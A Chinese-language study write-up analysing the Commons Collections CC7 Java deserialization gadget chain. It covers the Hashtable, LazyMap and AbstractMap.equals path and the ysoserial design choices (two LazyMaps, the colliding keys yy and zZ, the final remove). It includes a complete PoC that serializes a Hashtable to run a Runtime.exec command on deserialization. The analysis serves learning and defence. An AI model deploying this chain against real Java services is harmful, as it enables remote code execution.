实际上在之后CC7的学习中，发现了HashTable在CC7链中的运用不仅仅是key.hashcode一条路，如ysoserial中提供的equals方法的利用，对ysoserial的CC7进行理解，感觉对JAVA继承之间的关系调用理解更加深刻，同时对hashcode撞库攻击进行一定的认知，同时感觉ysoserial链的构造奇妙，因为在分析链的时候，对为什么要最后remove一个lazyMap的数据感到很奇怪，经过分析感觉确实是严丝合缝。

前提知识#

HashTable#

具体区别详情看su18师傅的相关介绍。

Hashtable 的 readObject 方法中，最后调用了 reconstitutionPut 方法将反序列化得到的 key-value 放在内部实现的 Entry 数组 table 里。

在reconstitutionPut方法中，调用了反序列化后key的hashcode。

Map&AbstractMap&HashMap关系#

实际上e.key.equals(key)同样可以触发漏洞。

但是首先，我们需要先理清Map、HashMap、AbstractMap之间的继承关系，因为我们需要用到equals方法。可以看到HashMap继承了AbstractMap，同时都实现了Map接口。

然后HashMap中没有实现equals方法，但是在其父类AbstractMap中实现了equals方法

重点分析一下AbstractMap中的equals方法

该函数会调用map的get方法，然而LazyMap正好实现Map接口，因此在这里可以有所作为。 但是触发这个是有条件的，以下三个判断都不能进入，否则代码执行不到触发点。

package CC7;

import Util.SeralizeUtil;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

/**
 * @ClassName CC7
 * @Description TODO
 * @Author reus09
 * @Date 2022/10/29 16:01
 * @Version 1.0
 **/
public class CC7 {

    public static String fileName = "CC7.bin";

    public static void main(String[] args) throws Exception {
        // 初始化 HashMap
        Hashtable<Object, Object> hashtable = new Hashtable<>();

        // 创建 ChainedTransformer
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a Calculator.app"})
        };

        // 创建一个空的 ChainedTransformer
        ChainedTransformer fakeChain = new ChainedTransformer(new Transformer[]{});

        // 创建 LazyMap 并引入 TiedMapEntry
        Map lazyMap = LazyMap.decorate(new HashMap(), fakeChain);
        TiedMapEntry entry   = new TiedMapEntry(lazyMap, "reus09");

        hashtable.put(entry, "reus09");

        //用反射再改回真的chain
        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(fakeChain, transformers);
        //清空由于 hashtable.put 对 LazyMap 造成的影响
        lazyMap.clear();

        SeralizeUtil.writeObjectToFile(hashtable, fileName);
        SeralizeUtil.readFileObject(fileName);
    }
}

ysoserial链#

前面的分析步骤与su18分析的一样，都是触发HashTable的反序列化过程中的reconstitutionPut方法，只不过这里是触发在e.key.equals(key)中。

e.key.equals(key)这里是完美的衔接点，它实现了将hashtable和LazyMap之间反序列化的连接。

POC#

主要步骤如下：

  1. 创建两个hashmap和两个Lazymap
  2. 向lazymap中填充以yy和zZ为key的两个键值对
  3. 将两个lazymap put进创建的hashtable中
  4. 修改transformerChain的iTransformers属性为命令执行链
  5. 删除lazyMap2中多余的key

                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),

问题分析#

1.为什么要LazyMap修饰的innerMap为HashMap#

这个其实就是我们在前提知识里面提到的东西，在构造LazyMap时 HashMap 作为decorate参数的第一个参数，那么这里为什么要使用HashMap呢，如果不认真分析这点很容易被忽略。因为要使用的是HashMap中的equals方法，那么这个传递关系如下图所示

向LazyMap传入Hashmap后在lazymap比较时会调用第一个map的equal方法，同时hashmap继承了AbstractMap类但没有重写equals方法，所以最终调用的是AbstractMap类中的equals方法，这也是为什么传入hashmap的原因。

2.为什么需要创建两个lazyMap#

因为我们需要调用equals方法，是需要传递两个不同的LazyMap的，因为HashTable的put方法，如果传入的lazyMap和之前的元素的hashcode和key相匹配，会认为是同一个。

3.为什么选择 yy 和 zZ 作为key？#

首先它俩的hashCode相等

然后其实在Hashtable中的reconstitutionPut方法,调用equals的条件也需要满足hash相同。

那为什么不能把两个key设成一样的呢？这样hash就相等了，但是如果继续往下跟代码的话就会发现在lazymap的get方法中有以下逻辑，map的key不能重复否则就不会执行transform函数执行代码了。

4.为什么要移除第二个LazyMap中的元素？#

还是因为hashTable的put方法问题。我们调试跟进一下。

可以看到，在没有加入到hashTable的时候，两个lazyMap的状态，size都为1

然后hashTable压入lazyMap1，此时仍然是正常的。

然后hashTable中压入lazyMap2,发现lazyMap2中的元素变为两个。

里面其实就是put方法在里面起了作用，我们来具体分析一下。

压入lazyMap2的时候，entry.key.equals(key)方法会起作用。

然后equals方法会一路触发，一直到我们分析的AbstractMap的equals方法里面，而在equals方法会调用lazyMap.get(key)方法，从而实现在lazyMap2中将hashMap1中的元素添加进去。

所以lazyMap2中变成了两个元素，为了满足后面反序列进入equals方法的条件，两个lazyMap的size必须一致。

因此需要去除掉多余的元素。

总结#

以上就是 CC7 链分析的全部内容了，最后总结一下。

  1. 利用说明：
    • 用 Hashtable 代替 HashMap 触发 LazyMap 方式，与 CC6 HashMap 几乎一致。
    • 同时对ysoserial对于CC7链的分析进行了学习。
  2. Gadget 总结：
    • kick-off gadget：java.util.Hashtable#readObject()
    • sink gadget：org.apache.commons.collections.functors.InvokerTransformer#transform()
    • chain gadget：org.apache.commons.collections.keyvalue.TiedMapEntry#hashCode()
